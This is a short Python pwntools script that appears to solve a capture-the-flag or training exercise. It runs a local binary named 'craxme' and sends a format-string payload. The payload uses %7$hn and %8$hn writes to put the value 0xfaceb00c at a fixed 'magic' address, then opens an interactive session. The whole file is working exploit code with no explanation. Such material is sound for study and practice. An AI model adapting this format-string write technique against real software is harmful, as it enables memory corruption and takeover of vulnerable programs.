#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

p = process("craxme")

magic_addr = 0x804a038

p.recvline()
p.recv()

payload  = p32(magic_addr)
payload += p32(magic_addr+2)
payload += "%{}c".format(0xb00c-8)
payload += "%7$hn"
payload += "%{}c".format(0xface-0xb00c)
payload += "%8$hn"
payload += "A"

p.send(payload)
p.recvuntil("A")

p.interactive()
p.close()
